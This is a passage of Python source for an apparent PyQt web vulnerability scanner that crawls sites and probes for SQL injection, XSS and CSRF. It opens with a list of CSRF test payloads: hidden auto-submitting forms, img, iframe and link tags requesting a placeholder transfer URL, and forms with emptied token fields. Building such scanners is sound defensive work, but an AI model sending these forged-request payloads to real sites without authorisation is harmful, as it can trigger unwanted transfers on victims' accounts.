    # ===== –ì–†–£–ü–ü–ê 1: –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ —Ñ–æ—Ä–º—ã =====
    # –§–æ—Ä–º—ã, –∫–æ—Ç–æ—Ä—ã–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –±–µ–∑ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    '<form action="/target" method="POST"><input type="hidden" name="amount" value="1000"></form>',
    '<form action="/target" method="POST"><input type="hidden" name="to" value="attacker"></form>',
    
    # ===== –ì–†–£–ü–ü–ê 2: –°–∫—Ä—ã—Ç—ã–µ –∑–∞–ø—Ä–æ—Å—ã —á–µ—Ä–µ–∑ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è =====
    # GET-–∑–∞–ø—Ä–æ—Å—ã —á–µ—Ä–µ–∑ img src (–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è –±—Ä–∞—É–∑–µ—Ä–æ–º)
    '<img src="http://target.site/transfer?amount=1000&to=attacker">',
    
    # ===== –ì–†–£–ü–ü–ê 3: JavaScript fetch –∑–∞–ø—Ä–æ—Å—ã =====
    # –°–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π —Å–ø–æ—Å–æ–± –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è CSRF —á–µ—Ä–µ–∑ JavaScript
    '<script>fetch("/target",{method:"POST",body:"amount=1000"})</script>',
    
    # ===== –ì–†–£–ü–ü–ê 4: iframe-based –∞—Ç–∞–∫–∏ =====
    # –°–∫—Ä—ã—Ç—ã–µ iframe –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∑–∞–ø—Ä–æ—Å–æ–≤
    '<iframe src="http://target.site/transfer?amount=1000&to=attacker"></iframe>',
    
    # ===== –ì–†–£–ü–ü–ê 5: CSS-based –∞—Ç–∞–∫–∏ =====
    # –ó–∞–ø—Ä–æ—Å—ã —á–µ—Ä–µ–∑ CSS @import –∏–ª–∏ link
    '<link rel="stylesheet" href="http://target.site/transfer?amount=1000&to=attacker">',
    
    # ===== –ì–†–£–ü–ü–ê 6: –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º =====
    # –§–æ—Ä–º—ã —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –æ—Ç–ø—Ä–∞–≤–∫–æ–π —á–µ—Ä–µ–∑ onload
    '<body onload="document.forms[0].submit()">',
    
    # ===== –ì–†–£–ü–ü–ê 7: –ü—É—Å—Ç—ã–µ CSRF —Ç–æ–∫–µ–Ω—ã =====
    # –ü–æ–ø—ã—Ç–∫–∏ –æ–±–æ–π—Ç–∏ CSRF –∑–∞—â–∏—Ç—É —Å –ø—É—Å—Ç—ã–º–∏ —Ç–æ–∫–µ–Ω–∞–º–∏
    '<form action="/target" method="POST"><input type="hidden" name="csrf_token" value=""></form>',
    '<form action="/target" method="POST"><input type="hidden" name="token" value=""></form>',
    '<form action="/target" method="POST"><input type="hidden" name="authenticity_token" value=""></form>',
    '<form action="/target" method="POST"><input type="hidden" name="_csrf" value=""></form>',
    '<form action="/target" method="POST"><input type="hidden" name="_token" value=""></form>',
    '<form action="/target" method="POST"><input type="hidden" name="csrfmiddlewaretoken" value=""></form>',
    '<form action="/target" method="POST"><input type="hidden" name="__RequestVerificationToken" value=""></form>',
]

# –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
FORM_INPUT_TYPES: Set[str] = {'text', 'textarea', 'password', 'email', 'search', 'url', 'tel', 'number'}
EXCLUDED_EXTENSIONS: Set[str] = {'.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.woff', '.woff2', '.ttf', '.eot', '.pdf', '.zip', '.gz', '.rar', '.xml', '.rss'}
MAX_PAYLOADS_PER_URL: int = 40

SKIP_EXTENSIONS: Set[str] = {
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico',
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.zip', '.rar', '.7z', '.tar', '.gz',
    '.mp3', '.wav', '.mp4', '.avi', '.mov', '.mkv',
    '.exe', '.dll', '.bin', '.iso'
}

def is_file_url(url: str) -> bool:
    path = urlparse(url).path
    _, ext = os.path.splitext(path)
    return ext.lower() in SKIP_EXTENSIONS

class ScanWorkerSignals(QObject):
    result: pyqtSignal = pyqtSignal(dict) # –°–∏–≥–Ω–∞–ª –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    progress: pyqtSignal = pyqtSignal(int, str) # –°–∏–≥–Ω–∞–ª –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    progress_updated: pyqtSignal = pyqtSignal(int) # –°–∏–≥–Ω–∞–ª –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    vulnerability_found: pyqtSignal = pyqtSignal(str, str, str, str) # –°–∏–≥–Ω–∞–ª –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
    log_event: pyqtSignal = pyqtSignal(str) # –°–∏–≥–Ω–∞–ª –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è —Å–æ–±—ã—Ç–∏–π
    stats_updated: pyqtSignal = pyqtSignal(str, int)  # –°–∏–≥–Ω–∞–ª –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ (–∫–ª—é—á, –∑–Ω–∞—á–µ–Ω–∏–µ)

# --- LRU-–∫—ç—à –¥–ª—è –ø–∞—Ä—Å–∏–Ω–≥–∞ HTML (100 –ø–æ—Å–ª–µ–¥–Ω–∏—Ö —Å—Ç—Ä–∞–Ω–∏—Ü) ---
@lru_cache(maxsize=100)
def cached_parse_html(html: str, parser: str = 'html.parser') -> BeautifulSoup:
    return BeautifulSoup(html, parser)

class ScanWorker:
    """
    –ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–π –≤–æ—Ä–∫–µ—Ä –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –≤–µ–±-—Å–∞–π—Ç–æ–≤ –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏.
    –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ, –ø–∞—É–∑—É, –æ—Å—Ç–∞–Ω–æ–≤–∫—É –∏ –≤–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ.
    """
    
    def __init__(self, url: str, scan_types: List[str], user_id: int, username: Optional[str] = None,
                 max_depth: int = 3, max_concurrent: int = 10, timeout: int = 10):
        """
        –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç ScanWorker.
        
        :param url: URL –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        :param scan_types: –°–ø–∏—Å–æ–∫ —Ç–∏–ø–æ–≤ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏
        :param user_id: ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        :param username: –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        :param max_depth: –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –≥–ª—É–±–∏–Ω–∞ –æ–±—Ö–æ–¥–∞
        :param max_concurrent: –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
        :param timeout: –¢–∞–π–º–∞—É—Ç –¥–ª—è –∑–∞–ø—Ä–æ—Å–æ–≤
        """
        self.base_url = url
        self.current_url = ""
        self.scan_types = scan_types
        self.user_id = user_id
        self.username = username
        self.max_depth = max_depth
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        
        # –°–∏–≥–Ω–∞–ª—ã –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è UI
        self.signals = ScanWorkerSignals()
        
        # –°–æ—Å—Ç–æ—è–Ω–∏–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        self.should_stop = False
        self._is_paused = False
        
        # –°—á–µ—Ç—á–∏–∫–∏ –∏ –º–µ—Ç—Ä–∏–∫–∏
        self.start_time = 0
        self.total_links_count = 0
        self.total_forms_count = 0
        self.scanned_forms_count = 0
        self.total_scanned_count = 0
        self.max_depth_reached = 0
        self.current_depth = 0  # –¢–µ–∫—É—â–∞—è –≥–ª—É–±–∏–Ω–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        self.memory_check_interval = 100
        self.operation_count = 0
        
        # –°—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è
        self.visited_urls: Set[str] = set()
        self.scanned_urls: Set[str] = set()
        self.all_scanned_urls: Set[str] = set()
        self.all_found_forms: List[Dict[str, Any]] = []
        self.scanned_form_hashes: Set[str] = set()
        
        # –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
        self.vulnerabilities: Dict[str, List[Dict[str, Any]]] = {'sql': [], 'xss': [], 'csrf': []}
        
        # –û—á–µ—Ä–µ–¥—å –¥–ª—è URL
        self.to_visit: Optional[asyncio.Queue[Tuple[str, int]]] = None  # –ë—É–¥–µ—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞ –≤ –º–µ—Ç–æ–¥–µ scan()
        
        # –ú–µ—Ç—Ä–∏–∫–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        self.scan_completion_metrics: Dict[str, Union[Optional[float], str, int]] = {
            'scan_start_time': None,
            'scan_end_time': None,
            'completion_status': 'not_started',
            'total_urls_discovered': 0,
            'total_urls_scanned': 0,
            'total_forms_discovered': 0,
            'total_forms_scanned': 0,
            'max_depth_reached': 0,
            'errors_encountered': 0
        }
        
        self.max_coverage_mode = False  # –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –≤—ã–∫–ª—é—á–µ–Ω–æ
        self.unscanned_urls: Set[str] = set()     # –¥–ª—è —Å–±–æ—Ä–∞ –Ω–µ–ø—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö URL

        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–µ—Å—Å–∏–∏
        self.session = None

        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫—ç—à–µ–π —Å TTL
        self.html_cache = TTLCache(maxsize=100, ttl=300)
        self.dns_cache = TTLCache(maxsize=100, ttl=300)
        self.form_cache = TTLCache(maxsize=100, ttl=300)
        self.url_cache = TTLCache(maxsize=100, ttl=300)
        
        logger.info(f"ScanWorker initialized for {url} with types: {scan_types}")

    def _cleanup_caches(self):
        self.html_cache.clear()
        self.dns_cache.clear()
        self.form_cache.clear()
        if hasattr(self, 'url_cache'):
            self.url_cache.clear()
        self.operation_count = 0
        logger.debug("Caches cleaned up")

    def update_stats(self):
        """–û–±–Ω–æ–≤–ª—è–µ—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è —á–µ—Ä–µ–∑ —Å–∏–≥–Ω–∞–ª stats_updated"""
        try:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∏–≥–Ω–∞–ª—ã –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
            self.signals.stats_updated.emit('urls_found', len(self.visited_urls))
            self.signals.stats_updated.emit('urls_scanned', len(self.all_scanned_urls))
            self.signals.stats_updated.emit('forms_found', self.total_forms_count)
            self.signals.stats_updated.emit('forms_scanned', self.scanned_forms_count)
            self.signals.stats_updated.emit('vulnerabilities', len(self.vulnerabilities.get('sql', [])) + 
                                                              len(self.vulnerabilities.get('xss', [])) + 
                                                              len(self.vulnerabilities.get('csrf', [])))
            self.signals.stats_updated.emit('requests_sent', self.total_scanned_count)
            self.signals.stats_updated.emit('errors', self.scan_completion_metrics.get('errors_encountered', 0))

            # –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
            if self.start_time > 0:
                elapsed = int(time.time() - self.start_time)
                hours = elapsed // 3600
                minutes = (elapsed % 3600) // 60
                seconds = elapsed % 60
                time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
                self.signals.stats_updated.emit('scan_time', time_str)
        except Exception as e:
            logger.error(f"Error updating stats: {e}")

    def _manage_memory_usage(self):
        """–£–ø—Ä–∞–≤–ª—è–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø–∞–º—è—Ç–∏ —á–µ—Ä–µ–∑ –∫–æ–Ω—Ç—Ä–æ–ª—å –∫—ç—à–µ–π"""

        import psutil
        memory_percent = psutil.virtual_memory().percent
        if memory_percent > 80:  # –ï—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–∞–º—è—Ç–∏ > 80%
            # –£–º–µ–Ω—å—à–∞–µ–º —Ä–∞–∑–º–µ—Ä –∫—ç—à–µ–π
            if hasattr(self, 'html_cache'):
                self.html_cache.maxsize = max(100, self.html_cache.maxsize // 2)

            self.dns_cache.maxsize = max(500, self.dns_cache.maxsize // 2)
            self.form_cache.maxsize = max(250, self.form_cache.maxsize // 2)
            self.url_cache.maxsize = max(500, self.url_cache.maxsize // 2)
            
            # –û—á–∏—â–∞–µ–º —á–∞—Å—Ç—å –∫—ç—à–∞
            self.html_cache.clear()
            self.dns_cache.clear()
            self.form_cache.clear()
            self.url_cache.clear()
            
            logger.warning(f"Memory usage {memory_percent}% > 80%. Cache sizes reduced and cleared.")


    def _check_memory_periodically(self):
        """–ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–∞–º—è—Ç–∏"""
        self.operation_count += 1
        if hasattr(self, 'operation_count') and self.operation_count >= self.memory_check_interval:
            self._manage_memory_usage()
            self.operation_count = 0
    
    async def scan_url(self, url: str) -> Optional[str]:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–∞–º—è—Ç–∏ –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏
        self._check_memory_periodically()

        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫—ç—à–∞ –ø–µ—Ä–µ–¥ –æ–±—Ä–∞–±–æ—Ç–∫–æ–π URL
        cache_key = f"scan_url{url}"
        cached_result: Optional[str] = cast(Optional[str], URL_PROCESSING_CACHE.get(cache_key))
        if cached_result is not None:
            logger.debug(f"Cache hit for {url}")
            return cached_result

        # –û–±—Ä–∞–±–æ—Ç–∫–∞ URL
        result = await self._process_url(url)

        # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ –∫—ç—à
        self.html_cache.set(url, result)

        # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ—Å–ª–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ URL
        self.update_stats()

        return result

    async def _process_url(self, url: str) -> Optional[str]:
        """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç URL –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç"""
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–ª–∞–≥–∏ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏ –ø–∞—É–∑—ã –ø–µ—Ä–µ–¥ –æ–±—Ä–∞–±–æ—Ç–∫–æ–π URL
            if self.should_stop or self._is_paused:
                return None

            if self.session is None:
                logger.warning(f"Session is None for URL {url}")
                return None
            async with self.session.get(url) as response:
                return await response.text()
        except Exception as e:
            logger.error(f"Error processing URL {url}: {e}")
            return None
        

    def stop(self):
        """
        –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ.
        """
        self.should_stop = True
        logger.info(f"Stop signal sent for scan of {self.base_url}")

    def pause(self):
        """
        –ü—Ä–∏–æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ.
        """
        self._is_paused = True
        logger.info(f"Pause signal sent for scan of {self.base_url}")

    def resume(self):
        """
        –í–æ–∑–æ–±–Ω–æ–≤–ª—è–µ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ.
        """
        self._is_paused = False
        logger.info(f"Resume signal sent for scan of {self.base_url}")

    def is_paused(self):
        """
        –ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –ª–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ –ø–∞—É–∑–µ.
        """
        return self._is_paused

    def calculate_progress(self, queue_size: int = 0) -> int:
        processed = self.total_scanned_count
        total = processed + queue_size
        if total == 0:
            total = 1
        progress = int((processed / total) * 100)
        return min(progress, 100)

    def update_progress(self, current_url: str = "", current_depth: Optional[int] = None, queue_size: Optional[int] = None):
        # –ï—Å–ª–∏ queue_size –Ω–µ –ø–µ—Ä–µ–¥–∞–Ω, –ø—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –∏–∑ –æ—á–µ—Ä–µ–¥–∏
        if queue_size is None:
            if self.to_visit is not None and hasattr(self.to_visit, 'qsize'):
                try:
                    queue_size = self.to_visit.qsize()
                except (AttributeError, RuntimeError) as e:
                    logger.warning(f"Error getting queue size for {self.base_url}: {e} ")
                    queue_size = 0
            else:
                queue_size = 0
        
        # –£–±–µ–¥–∏–º—Å—è, —á—Ç–æ queue_size —è–≤–ª—è–µ—Ç—Å—è —Ü–µ–ª—ã–º —á–∏—Å–ª–æ–º
        actual_queue_size = int(queue_size)

        progress = self.calculate_progress(actual_queue_size)

        # –û–±–Ω–æ–≤–ª—è–µ–º –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é –¥–æ—Å—Ç–∏–≥–Ω—É—Ç—É—é –≥–ª—É–±–∏–Ω—É
        if current_depth is not None and current_depth > self.max_depth_reached:
            self.max_depth_reached = current_depth
            logger.info(f"PROGRESS: New max depth reached: {self.max_depth_reached} at URL: {current_url}")

        depth_info = f"{current_depth if current_depth is not None else self.current_depth}/{self.max_depth}"
        url_info = f"{len(self.all_scanned_urls)}/{self.total_links_count}"
        
        # –£–±–µ–∂–¥–∞–µ–º—Å—è, —á—Ç–æ scanned_forms_count –Ω–µ –ø—Ä–µ–≤—ã—à–∞–µ—Ç total_forms_count
        if self.scanned_forms_count > self.total_forms_count:
            self.scanned_forms_count = self.total_forms_count
        
        form_info = f"{self.scanned_forms_count}/{self.total_forms_count}"
        
        # –î–æ–±–∞–≤–ª—è–µ–º –æ—Ç–ª–∞–¥–æ—á–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
        if self.total_forms_count > 0 or self.scanned_forms_count > 0:
            logger.debug(f"Form counters: scanned={self.scanned_forms_count}, total={self.total_forms_count}")
            logger.info(f"Forms progress: {self.scanned_forms_count}/{self.total_forms_count} ({len(self.scanned_form_hashes)} unique forms scanned)")
        
        progress_info = (
            f"Progress: {progress}% | "
            f"Depth: {depth_info} | "
            f"URL: {url_info} | "
            f"Forms: {form_info}"
        )
        if current_url:
            progress_info += f" | Processed URL: {current_url}"
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –≤ –ª–æ–≥
        self.signals.log_event.emit(progress_info)

        # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
        logger.info(f"DEBUG: Progress update - current_depth: {current_depth}, max_depth_reached: {self.max_depth_reached}, queue_size: {actual_queue_size}")
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –≤ UI (–æ–±–Ω–æ–≤–ª—è–µ–º –∫–∞–∂–¥—ã–µ 5% –∏–ª–∏ –ø—Ä–∏ –∫–∞–∂–¥–æ–º URL)
        if progress % 5 == 0 or current_url:
            self.signals.progress.emit(progress, current_url or self.base_url)
        
        # –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –æ–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –∫–∞–∂–¥—ã–µ 10 –æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö URL
        if len(self.all_scanned_urls) % 10 == 0 and len(self.all_scanned_urls) > 0:
            self.signals.progress.emit(progress, current_url or self.base_url)

    async def crawl(self, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore) -> None:
        """
        –≠–¢–ê–ü 1: –ö—Ä–∞—É–ª–∏–Ω–≥ ‚Äî –æ–±—Ö–æ–¥ —Å–∞–π—Ç–∞, —Å–±–æ—Ä –≤—Å–µ—Ö —Å—Å—ã–ª–æ–∫ –∏ —Ñ–æ—Ä–º.
        –û–±–Ω–æ–≤–ª—è–µ—Ç –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã self.visited_urls, self.all_found_forms –∏ —Ç.–¥.
        """
        try:
            logger.info(f"Starting crawl for URL: {self.base_url}")
            self.signals.log_event.emit(f"üîç –ù–∞—á–∏–Ω–∞–µ–º –æ–±—Ö–æ–¥ —Å–∞–π—Ç–∞: {self.base_url}")

            # –û—á–∏—Å—Ç–∫–∞ –∫—ç—à–µ–π –∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –æ—á–µ—Ä–µ–¥–∏
            self.visited_urls.clear()
            self.scanned_urls.clear()
            self.all_scanned_urls.clear()
            self.all_found_forms.clear()
            self.scanned_form_hashes.clear()
            self.to_visit = asyncio.Queue()
            await self.to_visit.put((self.base_url, 0))
            self.total_links_count = 1

            # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º results_by_type –ø–µ—Ä–µ–¥ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º
            results_by_type: Dict[str, List[str]] = {'sql': [], 'xss': [], 'csrf': []}

            # –ó–∞–ø—É—Å–∫ –æ–±—Ö–æ–¥–∞ —Å –ø–∞—Ä–∞–ª–ª–µ–ª–∏–∑–º–æ–º
            await self.crawl_and_scan_parallel(session, semaphore, self.base_url,
                                            results_by_type=results_by_type,
                                            visited_urls=self.visited_urls,
                                            scanned_urls=self.scanned_urls)
            logger.info(f"Crawling completed. Total URLs found: {len(self.visited_urls)}")
            self.signals.log_event.emit(f"‚úÖ –û–±—Ö–æ–¥ –∑–∞–≤–µ—Ä—à—ë–Ω. –ù–∞–π–¥–µ–Ω–æ URL: {len(self.visited_urls)}")

        except Exception as e:
            log_and_notify('error', f"Error in crawl: {e}")
            self.signals.log_event.emit(f"‚ùå –û—à–∏–±–∫–∞ –æ–±—Ö–æ–¥–∞: {str(e)}")
            raise

    async def crawl_and_scan_parallel(self, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore,
                                      start_url: str, results_by_type: Dict[str, List[str]], visited_urls: Set[str], scanned_urls: Set[str]):
        """
        –ü–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å –æ–±—Ö–æ–¥–æ–º —Å—Å—ã–ª–æ–∫.
        """
        try:
            logger.info(f"Starting crawl_and_scan_parallel for {start_url}")

            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –æ—á–µ—Ä–µ–¥—å —Å–æ–∑–¥–∞–Ω–∞
            if self.to_visit is None:
                log_and_notify('error', "Queue to_visit is None! Cannot proceed with scanning.")
                return

            logger.info(f"Queue size at start: {self.to_visit.qsize()}")
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –æ—á–µ—Ä–µ–¥—å –Ω–µ –ø—É—Å—Ç–∞
            if self.to_visit.qsize() == 0:
                logger.warning("Queue is empty at start of crawl_and_scan_parallel!")
            processed_count = 0

            # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º URL –∏–∑ –æ—á–µ—Ä–µ–¥–∏
            logger.info(f"Starting to process URLs from queue. Queue size: {self.to_visit.qsize()}")
            while not self.to_visit.empty() and not self.should_stop:
                try:
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–∞—É–∑—É –ø–µ—Ä–µ–¥ –æ–±—Ä–∞–±–æ—Ç–∫–æ–π URL
                    if self._is_paused:
                        await asyncio.sleep(0.1)  # –ß–∞—â–µ –ø—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å –ø–∞—É–∑—ã
                        continue

                    url, current_depth = await self.to_visit.get()
                    processed_count += 1
                    logger.info(f"Processing URL {processed_count}: {url} at depth {current_depth} (max_depth: {self.max_depth})")
                    logger.info(f"Queue size after getting URL: {self.to_visit.qsize()}")

                    if self.should_stop:
                        logger.info("Received request to stop scanning. Finishing...")
                        break

                    if current_depth > self.max_depth:
                        logger.info(f"Reached maximum depth {self.max_depth} for {url} - SKIPPING")
                        continue

                    # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º URL —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ–¥–Ω–æ–≥–æ –º–µ—Ç–æ–¥–∞ –¥–ª—è –≤—Å–µ—Ö –≥–ª—É–±–∏–Ω
                    logger.info(f"Processing URL {url} at depth {current_depth} using _process_and_scan_url")
                    await self._process_and_scan_url(session, semaphore, url, visited_urls, scanned_urls,
                                                     set(), results_by_type, self.to_visit, current_depth)

                    # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ—Å–ª–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–∞–∂–¥–æ–≥–æ URL
                    self.update_stats()

                except asyncio.CancelledError:
                    logger.info("Scanning task cancelled.")
                    break
                except Exception as e:
                    log_and_notify('error', f"Error in scanning task: {e}")

            logger.info(f"Main scanning loop completed. Processed {processed_count} URLs.")
            logger.info(f"Final queue size: {self.to_visit.qsize()}")
            logger.info(f"Max depth reached: {self.max_depth_reached}")

        except Exception as e:
            log_and_notify('error', f"Error in crawl_and_scan_parallel: {e})")

    async def _process_and_scan_url(
        self,
        session: aiohttp.ClientSession,
        semaphore: asyncio.Semaphore,
        url: str,
        visited_urls: Set[str],
        scanned_urls: Set[str],
        seen_urls: Set[str],
        results_by_type: Dict[str, List[str]],
        to_visit: asyncio.Queue[Tuple[str, int]],
        current_depth: int
    ) -> Tuple[Set[str], List[Tag]]:
        """
        –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∏ —Å–∫–∞–Ω–∏—Ä—É–µ—Ç –æ–¥–∏–Ω URL.
        """
        links: Set[str] = set()
        forms: List[Tag] = []

        if url in visited_urls or url in seen_urls:
            return set(), []

        if self._is_paused or self.should_stop:
            return set(), []

        # –î–æ–±–∞–≤–ª—è–µ–º URL —Ç–æ–ª—å–∫–æ –≤ seen_urls –Ω–∞ –Ω–∞—á–∞–ª—å–Ω–æ–º —ç—Ç–∞–ø–µ
        seen_urls.add(url)
        logger.info(f"Scanning URL: {url} at depth {current_depth}")

        try:
